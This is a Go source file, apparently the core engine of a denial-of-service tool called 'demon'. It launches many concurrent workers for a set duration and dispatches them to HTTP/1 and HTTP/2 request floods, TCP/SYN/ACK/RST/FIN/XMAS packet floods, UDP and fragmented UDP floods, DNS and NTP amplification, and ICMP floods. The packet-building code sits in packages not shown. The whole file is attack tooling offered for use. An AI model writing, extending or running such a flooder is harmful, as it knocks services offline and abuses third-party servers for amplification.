package engine

import (
	"runtime"
	"sync"
	"time"

	"github.com/0xTM7/demon/internal/config"
	"github.com/0xTM7/demon/internal/engine/l3"
	"github.com/0xTM7/demon/internal/engine/l4"
	"github.com/0xTM7/demon/internal/engine/l7"
)

type Executor struct {
	Cfg *config.DemonConfig
}

func NewExecutor(Cfg *config.DemonConfig) *Executor {
	return &Executor{Cfg: Cfg}
}

func (E *Executor) Run() {
	Stop := make(chan struct{})
	var WG sync.WaitGroup

	Workers := E.Cfg.Threads
	if E.Cfg.ClusterMode {
		Workers = E.Cfg.Threads * runtime.NumCPU()
	}

	for I := 0; I < Workers; I++ {
		WG.Add(1)
		go func() {
			defer WG.Done()
			E.dispatch(Stop)
		}()
	}

	time.Sleep(time.Duration(E.Cfg.Duration) * time.Second)
	close(Stop)
	WG.Wait()
}

func (E *Executor) dispatch(Stop <-chan struct{}) {
	C := E.Cfg

	switch C.Method {
	case config.MethodGET, config.MethodPOST, config.MethodPUT,
		config.MethodPATCH, config.MethodDELETE, config.MethodHEAD,
		config.MethodOPTIONS, config.MethodTRACE, config.MethodCONNECT,
		config.MethodRANDOM:
		if C.Protocol == config.ProtoH2 {
			l7.RunH2Worker(C, Stop)
		} else {
			l7.RunH1Worker(C, Stop)
		}

	case config.MethodTCP:
		l4.RunTCPWorker(C, Stop)
	case config.MethodSYN:
		l4.RunRawTCPWorker(C, l4.FlagSYN, Stop)
	case config.MethodACK:
		l4.RunRawTCPWorker(C, l4.FlagACK, Stop)
	case config.MethodRST:
		l4.RunRawTCPWorker(C, l4.FlagRST, Stop)
	case config.MethodFIN:
		l4.RunRawTCPWorker(C, l4.FlagFIN, Stop)
	case config.MethodXMAS:
		l4.RunRawTCPWorker(C, l4.FlagFIN|l4.FlagPSH|l4.FlagURG, Stop)
	case config.MethodUDP:
		l4.RunUDPWorker(C, Stop)
	case config.MethodUDPFRAG:
		l4.RunUDPFragWorker(C, Stop)
	case config.MethodDNSAMP:
		l4.RunDNSAmpWorker(C, Stop)
	case config.MethodNTPAMP:
		l4.RunNTPAmpWorker(C, Stop)

	case config.MethodICMP:
		l3.RunICMPWorker(C, Stop)
	}
}
